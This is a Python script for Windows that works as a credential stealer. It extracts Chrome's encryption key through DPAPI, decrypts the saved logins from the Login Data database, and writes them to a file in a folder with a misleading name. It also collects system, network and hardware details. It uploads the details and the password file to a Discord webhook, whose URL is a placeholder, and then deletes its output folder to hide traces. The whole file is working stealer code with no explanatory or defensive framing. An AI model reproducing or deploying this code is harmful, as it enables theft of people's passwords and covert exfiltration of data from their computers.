import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import requests
import shutil
import platform
import socket
import psutil
import time
from cryptography.hazmat.backends import default_backend

def get_encryption_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = file.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    key = key[5:]  
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(ciphertext, key):
    try:
        iv = ciphertext[3:15]
        ciphertext = ciphertext[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(ciphertext)[:-16].decode()
    except Exception as e:
        return ""

def get_system_details():
    uname = platform.uname()
    boot_time = time.time() - psutil.boot_time()
    battery_info = psutil.sensors_battery()
    battery_status = f"{battery_info.percent}% ({'Charging' if battery_info.power_plugged else 'Not Charging'})" if battery_info else "N/A"
    system_info = {
        'System': uname.system,
        'Node Name': uname.node,
        'Release': uname.release,
        'Version': uname.version,
        'Machine': uname.machine,
        'Processor': uname.processor,
        'IP Address': socket.gethostbyname(socket.gethostname()),
        'CPU Usage': f"{psutil.cpu_percent()}%",
        'Memory Usage': f"{psutil.virtual_memory().percent}%",
        'Uptime': f"{int(boot_time // 3600)} hours {int((boot_time % 3600) // 60)} minutes",
        'Total RAM': f"{psutil.virtual_memory().total // (1024 * 1024)} MB",
        'Available RAM': f"{psutil.virtual_memory().available // (1024 * 1024)} MB",
        'System Architecture': platform.architecture()[0],
        'OS Version': platform.version(),
        'OS Build': platform.win32_ver()[1],
        'Battery Status': battery_status,
    }
    return system_info

def get_network_details():
    network_info = psutil.net_if_addrs()
    details = [
        f"{iface}: {', '.join(addr.address for addr in addrs)}"
        for iface, addrs in network_info.items()
    ]
    return "\n".join(details)

def get_hardware_details():
    cpu_freq = psutil.cpu_freq()
    gpu_info = "N/A"  
    try:
        import GPUtil
        gpus = GPUtil.getGPUs()
        gpu_info = ", ".join([f"GPU {i}: {gpu.name}, Memory Free: {gpu.memoryFree}MB" for i, gpu in enumerate(gpus)])
    except ImportError:
        gpu_info = "GPUtil library not installed"

    hardware_info = {
        'CPU Frequency': f"{cpu_freq.current} MHz" if cpu_freq else "N/A",
        'GPU Info': gpu_info,
        'Motherboard Info': "N/A" 
    }
    return hardware_info

def send_embed(webhook_url, embed_data):
    response = requests.post(webhook_url, json=embed_data)
    return response.status_code == 204

def send_file(webhook_url, file_path):
    with open(file_path, "rb") as f:
        files = {"file": f}
        response = requests.post(webhook_url, files=files)
    return response.status_code == 204

def cleanup_directory(directory_path):
    shutil.rmtree(directory_path, ignore_errors=True)

def main():
   
    output_directory = r'C:\WindowsOld\Chrome\Data'

    if not os.path.exists(output_directory):
        os.makedirs(output_directory)

    output_file_path = os.path.join(output_directory, "decrypted_passwords.txt")

    
    db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')

    
    shutil.copy2(db_path, "LoginDataCopy.db")
    db = sqlite3.connect("LoginDataCopy.db")
    cursor = db.cursor()

    cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
    
    key = get_encryption_key()

    with open(output_file_path, "w") as file:
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            encrypted_password = row[3]
            decrypted_password = decrypt_password(encrypted_password, key)

            if username or decrypted_password:
                file.write(f"Origin URL: {origin_url}\n")
                file.write(f"Action URL: {action_url}\n")
                file.write(f"Username: {username}\n")
                file.write(f"Password: {decrypted_password}\n")
                file.write("="*50 + "\n")

    cursor.close()
    db.close()
    os.remove("LoginDataCopy.db")

    webhook_url = "your_discord_webhook_url"

    
    system_details = get_system_details()
    network_details = get_network_details()
    hardware_details = get_hardware_details()

    
    embed = {
        "embeds": [
            {
                "title": "System and Network Information",
                "color": 3066993,   
                "fields": [
                    {"name": "System", "value": system_details['System'], "inline": True},
                    {"name": "Node Name", "value": system_details['Node Name'], "inline": True},
                    {"name": "Release", "value": system_details['Release'], "inline": True},
                    {"name": "Version", "value": system_details['Version'], "inline": True},
                    {"name": "Machine", "value": system_details['Machine'], "inline": True},
                    {"name": "Processor", "value": system_details['Processor'], "inline": True},
                    {"name": "IP Address", "value": system_details['IP Address'], "inline": True},
                    {"name": "CPU Usage", "value": system_details['CPU Usage'], "inline": True},
                    {"name": "Memory Usage", "value": system_details['Memory Usage'], "inline": True},
                    {"name": "Uptime", "value": system_details['Uptime'], "inline": True},
                    {"name": "Total RAM", "value": system_details['Total RAM'], "inline": True},
                    {"name": "Available RAM", "value": system_details['Available RAM'], "inline": True},
                    {"name": "System Architecture", "value": system_details['System Architecture'], "inline": True},
                    {"name": "OS Version", "value": system_details['OS Version'], "inline": True},
                    {"name": "OS Build", "value": system_details['OS Build'], "inline": True},
                    {"name": "Battery Status", "value": system_details['Battery Status'], "inline": True},
                    {"name": "Network Interfaces", "value": network_details, "inline": False},
                    {"name": "CPU Frequency", "value": hardware_details['CPU Frequency'], "inline": True},
                    {"name": "GPU Info", "value": hardware_details['GPU Info'], "inline": False},
                    {"name": "Motherboard Info", "value": hardware_details['Motherboard Info'], "inline": False},
                ]
            }
        ]
    }
    send_embed(webhook_url, embed)

     
    send_file(webhook_url, output_file_path)

    
    cleanup_directory(output_directory)

if __name__ == "__main__":
    main()
